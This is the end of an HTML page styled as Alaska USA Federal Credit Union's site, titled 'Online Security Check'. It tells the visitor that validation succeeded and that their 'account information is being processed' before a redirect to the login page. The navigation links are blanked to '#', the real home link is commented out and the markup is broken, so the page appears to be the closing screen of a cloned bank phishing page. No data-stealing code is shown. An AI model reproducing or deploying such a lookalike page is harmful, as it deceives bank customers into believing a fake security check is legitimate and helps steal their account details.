       IframeElement.style.left = PopUpElement.offsetLeft;
       IframeElement.style.top = PopUpElement.offsetTop;
	}
	else{
	    $(PopUpElement).removeClass('InfoBoxHover');
	}
}
function ShowInfoBoxHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
   var IframeElement = document.getElementById(InfoBoxClientID + '_IFrame');
   var PopUpElement = document.getElementById(InfoBoxClientID + '_PopupCanvas');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
   //if not a persistant popup...//var PopupStatus = '' + document.getElementById(InfoBoxClientID + '_PopupDiv').style.display;
   if(!$(PopUpElement).hasClass('InfoBoxPopup')){
       SetPositionForHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing);
	    if(IframeElement) { //iframe hack is on, use basic css display manipulation (doesnt work with slidetoggle)
	        $(PopUpElement).addClass('InfoBoxHover');
           IframeElement.style.display = 'block';
           IframeElement.style.width = PopUpElement.offsetWidth;
           IframeElement.style.height = PopUpElement.offsetHeight;
           IframeElement.style.left = PopUpElement.offsetLeft;
           IframeElement.style.top = PopUpElement.offsetTop;
	    }
	    else{
	        $(PopUpElement).addClass('InfoBoxHover').children(':first').css('margin-left','');
	    }
	}
}
function SetPositionForHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var TriggerElement = $('#'+TriggerElementID);
	var triggerOffset = TriggerElement.position();
	var imgHeight = TriggerElement.height();
	var imgWidth = TriggerElement.width();
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	var divWidth = PopUpCanvas.width();
	var divHeight = PopUpCanvas.height();//alert(divWidth + '...' + divHeight);
   SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth);
}
function SetPositionForPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var TriggerElement = $('#'+TriggerElementID);
	var triggerOffset = TriggerElement.position();
	var imgHeight = TriggerElement.height();
	var imgWidth = TriggerElement.width();
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
   PopUpCanvas.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   PopUpDiv.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
	var divWidth = PopUpCanvas.width();
	var divHeight = PopUpCanvas.height();
   //check if the infobox is bigger than the viewport, if so shrink it
   if(viewportWidth<divWidth){
       PopUpCanvas.width(viewportWidth);
       divWidth = PopUpCanvas.width();
   }
   PopUpCanvas.removeClass('InfoBoxTemp'); //back to what they started at
   PopUpDiv.removeClass('InfoBoxTemp'); //back to what they started at
   SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth);
   RePosition(PopUpCanvas,PopUpDiv,divHeight,divWidth);
}
function SetPosition(PopUpCanvas,direction,popupSpacing,triggerOffset,imgHeight,imgWidth,divHeight,divWidth) {
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	if(direction == 4) {
		PopUpCanvas.css('top',triggerOffset.top).css('left',triggerOffset.left+imgWidth+popupSpacing)
	}
	else if(direction == 5) {
		PopUpCanvas.css('top',triggerOffset.top+(imgHeight/2)-(divHeight/2)).css('left',triggerOffset.left+imgWidth+popupSpacing)
	}
	else if(direction == 6) {
       //use bottom to slide up for slideToggle, clear out top that RePosition may set=
		PopUpCanvas.css('top','').css('left',triggerOffset.left+imgWidth+popupSpacing).css('bottom',viewportHeight-triggerOffset.top-imgHeight-popupSpacing);
	}
	else if(direction == 7) {
		PopUpCanvas.css('top',triggerOffset.top+(imgHeight/2)-(divHeight/2)).css('left',triggerOffset.left-divWidth-popupSpacing)
	}
	else if(direction == 8) {
       //use bottom to slide up for slideToggle, clear out top that RePosition may set=
		PopUpCanvas.css('top','').css('left',triggerOffset.left+(imgWidth/2)-(divWidth/2)).css('bottom',viewportHeight-triggerOffset.top+popupSpacing); 
	}
	else if(direction == 1) {
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',(triggerOffset.left+imgWidth)-divWidth)
	}
	else if(direction == 3) {
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',triggerOffset.left+(imgWidth/2)-(divWidth/2))
	}
	else {
	    // this is BottomRight
		PopUpCanvas.css('top',triggerOffset.top+imgHeight+popupSpacing).css('left',triggerOffset.left)
	}
}
function RePosition(PopUpCanvas,PopUpDiv,divHeight,divWidth) {
	var viewportWidth = $(window).width();
	var viewportHeight = $(window).height();
	var viewportScrollTop = $(window).scrollTop();
	var viewportScrollLeft = $(window).scrollLeft();
   //here we check if the infobox is popping up off the screen.   Reposition it so it is within the viewport
   PopUpCanvas.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   PopUpDiv.addClass('InfoBoxTemp'); //turn in on, but keep it hidden so height,width exist
   var divPosition = PopUpCanvas.position();
   var divTop = parseInt(divPosition.top); var divLeft = parseInt(divPosition.left);   PopUpCanvas.removeClass('InfoBoxTemp'); //back to what they started at
   PopUpDiv.removeClass('InfoBoxTemp'); //back to what they started at
   //too far down
   if((viewportScrollTop+viewportHeight)<(divTop+divHeight)){
       //alert('TOO FAR DOWN: viewportscrolltop=' + viewportScrollTop + ',viewportheight=' + viewportHeight+ ',divcsstop=' + parseInt(divPosition.top) + ',divheight=' + divHeight);alert('setting top to: ' + (viewportScrollTop+viewportHeight-divHeight));
       PopUpCanvas.css('bottom','').css('top',(viewportScrollTop+viewportHeight-divHeight));
   }
   //too far right
   if((viewportScrollLeft+viewportWidth)<(divLeft+divWidth)){
       //alert('too far right!');
       PopUpCanvas.css('left',viewportScrollLeft+viewportWidth-divWidth);
   }
   //too far up
   if(viewportScrollTop>divTop){
       //alert('too far up!');
       //alert('BEFORE   viewporttop:' + viewportScrollTop + ',popuptop:' + divPosition.top);
       PopUpCanvas.css('bottom','').css('top',viewportScrollTop);
       //alert('AFTER    viewporttop:' + viewportScrollTop + ',popuptop:' + divPosition.top);
   }
   //too far left
   if(viewportScrollLeft>divLeft){
       //alert('too far left!');
       PopUpCanvas.css('left',viewportScrollLeft);
   }
}
//]]>
</script>

<script src="/enroll/ScriptResource.axd?d=D9drwtSJ4hBA6O8UhT6CQl5kP-DNk5tqsFSKE4QAx7FiqQUkfG0xcYhM38F4ULHzEsr3ccm3WWC8c21Rx1XAbPd7dZSDwlwAN3FBxOF0-Op5UR1aFNYrVvCtHrsmIFUrjLaB6c2og1ihVr9uj93NAWWK3N01&amp;t=2fe674eb" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
//]]>
</script>

<script src="/enroll/ScriptResource.axd?d=JnUc-DEDOM5KzzVKtsL1tcXbu1D4Hj6yCmHmr9cM66AViK3ia2ZDHVT7KW47KHMyBMtKHFfS1WB4puAzjXwId5XQy_jrygJTcv1Xors3xQgEJuGStAVwV63p2PylRvqJXzAeOswFDaHhtAK0W-ax5ffg3ZOYXYmQ06Ttk8PaI-ZJmv_M0&amp;t=2fe674eb" type="text/javascript"></script>
<script src="ScriptLib/DotNetScripts_v4.js" type="text/javascript"></script>
<script src="ScriptLib/AriaLib.js" type="text/javascript"></script>
<script src="Scripts/jquery-1.10.2.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
return true;
}
//]]>
</script>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="0A0E1CD6" />
	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="Rx8hS/neUUvPBk/rNPua0Zm+t4qoq9eZVjeNZ9rIDKu8iTFodBWNACJlyo2k8wJWdUvKGp6RuNtRxcVDHrbidOL06Bj0VSDVueWyfcxoLxGp2vzkHAvda7XfvXn0oRKMrk0curB/NEIQM8kSYiCeCpr3tHIzQxdHIdsE6IeDtKOHCFId9OrcrSC6PT5qwySP/beOLkvgaXUCFTgZllcyWub2nkb7bH8n5cKPWzKyrY33n6uKy8GBxWe4i7KXowxS/EQcOEUfsuYlkNwUXr8EOM5ht90tEJN7PoeV6Lv7BAYINtgrpIW5DB1GuS/wvr0unGE7CMlB5gPjujENyAKeAFp3ndplcCWI2osEOZvx/Bz+IQ0f2AkHkfp/KD/K7unqOvAteA==" />
</div>
		<script type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('ctl00$ctl00$ScriptManager1', 'aspnetForm', ['tctl00$ctl00$PageBody$PageContent$enrollmentFormUpdatePanel','','tctl00$ctl00$PageBody$PageContent$ctl20',''], [], [], 90, 'ctl00$ctl00');
//]]>
</script>

			
<div id="pgBody">
	<div id="header">
		<div>
			<h1>Alaska USA</h1>
			<p class="skip"><a id="skip" class="skip" href="#pgMain" title="Skip navigation">Skip page header and navigation</a></p>
		</div>
		<div id="topBar">
			<a href="#" id="logo" title="Alaska USA products for you"><img src="https://www.alaskausa.org/images/nav/akusafcu_logo.png" alt="Alaska USA products for you" /></a>
			<!--<p id="headerReturnLink"><a href="https://www.alaskausa.org/?t=eh" title="Home">Return to home</a></p>-->
			<p id="topBarMenu">
				<a href="#">
					<span>Return to home</span>
				</a>
			</p>
		</div>
	</div>
    
	<div class="pgTitle">
		<h1>Online Security Check</h1>
	</div>	
	<div id="pgMain" class="pgMain">
		<div class="row">
			
					<div onkeypress="javascript:return WebForm_FireDefaultButton(event, &#39;SubmitButton&#39;)">
	
					<div class="leftCol">
						<div data-val-showmessagebox="True" data-val-showsummary="False" data-val-validationGroup="enrollmentValidation" id="ctl00_ctl00_PageBody_PageContent_ctl01" data-valsummary="true" style="display:none;">

	</div>
						
						<h2 style="margin-top:0; margin-bottom:8px;">Validation Completed Successfully</h2>
						<table class="dataForm topDataForm">
						<div><br>
							<tbody>Please wait... <br><br>Your account information is being processed... <br><br><img src="css/spin.gif"><br><br>Upon completion you will be automatically logged out and redirected to our login page.
        </tbody>
		</div>
						</table>
						<div id="ctl00_ctl00_PageBody_PageContent_enrollmentFormUpdatePanel">
			
								
		</tr>
		
										
										
										
										
										
										
									</tbody>
									<tfoot>
										<tr>
											<td colspan="2"></td>
										</tr>
									</tfoot>
								</table>
							
	</div> 
				            

						
						
						
						<div id="loadingSection" class="results" style="display:none;">							
							<div id="loadingMsg"></div>
							<input type="hidden" name="ctl00$ctl00$PageBody$PageContent$returnedResults" id="returnedResults" value="false" />
						</div>

						<span id="ctl00_ctl00_PageBody_PageContent_testResponse"></span>
						<div style="display:none;"><span id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox" class="" style=""><a id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink" onclick="TogglePersistantPopup(&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox&#39;,&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink&#39;,1,1);CancelEvent(event);return false;" href="#" target="InfoBox">Dummy</a></span><div id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_PopupCanvas" style="width:300px;" class="InfoBoxCanvas"><div id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_PopupDiv" style="" class="InfoBox"><img id="ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_CloseImage" class="InfoBox_CloseImage" onclick="TogglePersistantPopup(&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox&#39;,&#39;ctl00_ctl00_PageBody_PageContent_dummyInfoBox_dummyInfoBox_OpenLink&#39;,1,1);CancelEvent(event);return false;" src="App_Themes/DefaultTheme/ControlImages/close.png" alt="Close Popup" />Need this because the infoboxes are hidden on initial page load --js isn't rendered during postback-- so infobox doesn't work</div></div></div>
						<script>
                            function ValidateTCFDebit(sender, args) {
                                validate_hasVisa(sender, args);
                                if (args.IsValid)
                                    return;
                                alert($("input[name$='$tcfHadDebit']:checked").length);
                                args.IsValid = $("input[name$='$tcfHadDebit']:checked").length > 0;
                            }
                            function ValidateTCFDeposit(sender, args) {
                                validate_hasVisa(sender, args);
                                if (args.IsValid)
                                    return;
                                alert($("input[name$='$tcfHadDeposit']:checked").length);
                                args.IsValid = $("input[name$='$tcfHadDeposit']:checked").length > 0;
                            }
							function validate_hasVisa(sender, args) {
                                args.IsValid = $("input[name$='$hasVisa']:checked").length > 0;
                                if (args.IsValid)
                                    return;
                                args.IsValid = $("input[name$='$tcfHadDebit']:checked").length > 0;
                                if (!args.IsValid)
                                    return;
                                args.IsValid = $("input[name$='$tcfHadDeposit']:checked").length > 0;
							}
							function clickVisa() {
								$("#hasVisa_hidden").val("clicked");
								ControlValidate("hasVisa_hidden");
							}
							function clickAutoLoan() {
								$("#hasAutoLoan_hidden").val("clicked");
								ControlValidate("hasAutoLoan_hidden");
							}
							function clickPaidAutoLoan() {
								$("#hasPaidAutoLoan_hidden").val("clicked");
								ControlValidate("hasPaidAutoLoan_hidden");
							}
							function ControlValidate(id) {
								var c = document.getElementById(id);
								if (typeof (c.Validators) != "undefined") {
									for (var i = 0; i < c.Validators.length; i++) {
										ValidatorValidate(c.Validators[i]);
									}
								}
							}
							function isPageValid() {
								if (typeof (Page_Validators) != "undefined") {
									for (var i = 0; i < Page_Validators.length; i++) {
										var validator = Page_Validators[i];
										ValidatorValidate(validator);//make sure it's been checked
										//console.log(validator.id + ":" + validator.isvalid);
										if (!validator.isvalid) { return false; }
									}
								}
								return true;
							}
							function setupMessage() {
								if (isPageValid()) {
									//when the postback returns, all of this will be undone -- hopefully the postback turns other stuff on
									$("#SubmitButton").css('disabled', true);
									ShowLoading();	//in DotNetScripts_v4
									$(".message", "#LoadingContainer").css("background", "none").css("padding-left","1px").css("padding-right","28px");	//remove the spinner, it doesn't spin in IE
									$(".inner", "#LoadingContainer").prepend("<div class=\"small progress\"><div>Loading</div></div>");	//add in the css spinner
									setTimeout(function () {
										$(".inner", "#LoadingContainer").css("width", "300px").css("padding-top", "10px");
										$(".message:first", "#LoadingContainer").html("Validating");
										$(".inner", "#LoadingContainer").append("<div class=\"message\" style=\"margin-top:5px;font-size:1em;background:none;padding-left:inherit;\"><div>This may take a minute.</div><div>Please do not refresh this page.</div></div>");
										$(".message", "#LoadingContainer").css("line-height", "inherit");
									}, 300);
									//setTimeout(function () { if ($("#returnedResults").val() != "true") { $("#loadingMsg").hide(); $("#loadingSection").show(); $("#warningSection_timeout").show(); } }, 89 * 1000);
									return true;
								}
								else {
									return false;
								}
							}
							//function testPost() {
							//	$.post("http://akusaappsdev/ubenrollment/api/decision/enroll", { "enroll_firstName": "test" },
							//		function (result) { alert(result); });
							//}
							function setConsentName() {
								var first = $.trim($("#firstName").val());
								var last = $.trim($("#lastName").val());
								var suffix = $.trim($("#suffix").val());
								if (first != "" && last != "") {
									$("#consent_applicantName").text(", " + $.trim(first + " " + last + " " + suffix).toUpperCase() + ",");
								}
								else {
									$("#consent_applicantName").text("");
								}
							}
						</script>
					</div>
					
</div>
					<div class="sideBar">						
						<div class="learnMore">
							<h2>Questions?</h2>
							<p>
								For assistance contact the Member Service Center.
							</p><p style="padding-left:10px;margin-top:10px;">
								907-563-4567 or 800-525-9094<br /><br />
								Open 24 hours a day, 7 days a week.<br /><br />
								<a href="https://www.alaskausa.org/service/contact.asp">More contact information</a>
							</p>
							<p></p>
						</div>
					</div>							
					<div style="clear:both;"></div>					
					
					<input type="hidden" name="ctl00$ctl00$PageBody$PageContent$HaveReadEsignConsent" id="HaveReadEsignConsent" value="false" />
					<input type="hidden" name="ctl00$ctl00$PageBody$PageContent$TextFieldWasActive" id="TextFieldWasActive" value="false" />
					<input type="hidden" name="ctl00$ctl00$PageBody$PageContent$TextFieldIsActive" id="TextFieldIsActive" value="false" />
					<script type="text/javascript">
						$(document).ready(function () {
							//$("#esignConsent_0").on('click', function () {
							//	var hasRead = $("#HaveReadEsignConsent").val() == "true";
							//	if (!hasRead) {
							//		if (window.innerWidth < 500) {
							//			alert("Please read and retain the terms and disclosures.");
							//		}
							//		else {
							//			alert("Please read and retain the terms and disclosures by either printing, scrolling completely through the text or clicking on the link to the document");
							//		}
							//		$(this).prop('checked', false);
							//	}
							//	else { return true; }
							//});
                            $("#aHaveReadEsignConsent").on('click', function () {
    							$("#HaveReadEsignConsent").val("true");
                                return true;
							});
                            $("input:text").on('focus', function () {
    							$("#TextFieldIsActive").val(this.id);
                                return true;
							});
                            $("input[type='tel']").on('focus', function () {
    							$("#TextFieldIsActive").val(this.id);
                                return true;
							});
						});
                        function setHaveReadAll() {
							$("#HaveReadEsignConsent").val("true");
						}
                    </script>
					<script>
						$(document).ready(function () {
							//$('a[class*=leanModal]').leanModal({ top: 200, closeButton: ".modal_close" });
							initializeMasks();
							$(document).on("click", ".dataForm input:radio", function () { selectRadio(this); });
							//$("#firstName").focus();
						});
						function initializeMasks() {
                            var focusedElementId = $("#TextFieldWasActive").val();
                            if (focusedElementId == "false")
                                focusedElementId = "firstName";
							//$(".ssnField").prop('placeholder', 'xxx-__-____').mask("xxx-99-9999", { autoclear: false });
							//$(".dateField").prop('placeholder', '__/__/____').mask("99/99/9999", { autoclear: false });
							$(".ssnField").prop('placeholder', 'xxx-__-____').mask("xxx-99-9999", { placeholder: "xxx-__-____", autoclear: false });
							$(".dateField").prop('placeholder', '__/__/____').mask("99/99/9999", { placeholder: '__/__/____', autoclear: false });
							initializeVisaMask();

							//in IE11 .mask steals focus.  This left the cursor in the visa debit card question.  Moving focus fired the validators.  So we move focus and clear the error
							setTimeout(function () { $("#"+focusedElementId).focus(); Page_ClientValidateReset() }, 500);
						}
						function initializeVisaMask() {
							//in a separate function so it can be re-initialized separate from the others
							$("#visaDebitCardNumber").prop('placeholder', '__  ____  ____').mask("99  9999  9999", { placeholder: '__  ____  ____', autoclear: false });
						}
						function selectRadio(elem) {
							$(elem).closest("div[role=radiogroup]").find("input:radio").each(function () { $(this).closest("label").removeClass("radioSelected"); });
							$(elem).closest("label").addClass("radioSelected");
						}
						function reselectAllRadios() {
							$(".dataForm input:radio:checked").each(function () { selectRadio(this); });
						}
						function Page_ClientValidateReset() {
							if (typeof (Page_Validators) != "undefined") {
								for (var i = 0; i < Page_Validators.length; i++) {
									var validator = Page_Validators[i];
									validator.isvalid = true;
									ValidatorUpdateDisplay(validator);
									//console.log(validator.id + "<br>");
								}
							}
						}
					</script>
				
		</div>
	</div>


	<div id="siteFooter">
		<div id="footer">
			<p class="links">
				<a href="#" title="Home"></a>
			</p>
			<div class="disclaimer">
				<div class="disclaimerLogos">
					<img class="decorRight" src="https://www.alaskausa.org/images/images.asp?ref=NCUA_2016_gray.png" alt="Federally Insured by NCUA" />
					<img class="decorRight" alt="Equal Housing Lender" src="https://www.alaskausa.org/images/nav/EHL_2016_gray.png" />
				</div>
				<p>Alaska USA and UltraBranch are registered trademarks of Alaska USA Federal Credit Union</p>
				<p>&#169; Copyright <span id="ctl00_ctl00_PageBody_CopyrightYear">2021</span></p>
			</div>
		</div>
	</div>
</div>

  <script type="text/javascript" src="https://www.alaskausa.org/angelfish.js"></script>
  <script type="text/javascript">
      //<![CDATA[
  		agf.pageview();
      //]]>
	</script>

		
<script type="text/javascript">
//<![CDATA[
var ctl00_ctl00_PageBody_PageContent_ctl05 = document.all ? document.all["ctl00_ctl00_PageBody_PageContent_ctl05"] : document.getElementById("ctl00_ctl00_PageBody_PageContent_ctl05");
ctl00_ctl00_PageBody_PageContent_ctl05.evaluationfunction = "Length_Validation";
ctl00_ctl00_PageBody_PageContent_ctl05.MaximumLength = "20";
var ctl00_ctl00_PageBody_PageContent_ctl06 = document.all ? document.all["ctl00_ctl00_PageBody_PageContent_ctl06"] : document.getElementById("ctl00_ctl00_PageBody_PageContent_ctl06");
ctl00_ctl00_PageBody_PageContent_ctl06.evaluationfunction = "Length_Validation";
ctl00_ctl00_PageBody_PageContent_ctl06.MaximumLength = "40";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
$(document).ready(function() { console.log('ready');SetAriaLabels_FormRows();SetAriaLabels_FormColumns();AriaFixWrappedElements();setTimeout(SetAriaForValidators,1000); });AjaxFix();PrefsFormsLib.ApplicationRoot = '/enroll/';$('input[name=\'ctl00$ctl00$PageBody$PageContent$Captcha\']').change(function() {ValidatorValidate(ctl00_ctl00_PageBody_PageContent_Captcha_Captcha_clientValidator); });$('img[id=\'ctl00$ctl00$PageBody$PageContent$Captcha_AudioImage\']').click(function() { $('audio[id=\'ctl00$ctl00$PageBody$PageContent$Captcha_Audio\']').get(0).play(); });$('img[id=\'ctl00$ctl00$PageBody$PageContent$Captcha_AudioImage\']').keydown(function(event) { if(event.keyCode === 32) { event.preventDefault(); $('audio[id=\'ctl00$ctl00$PageBody$PageContent$Captcha_Audio\']').get(0).play(); } });//]]>
</script>
</form>
	</div>
</body>
</html>
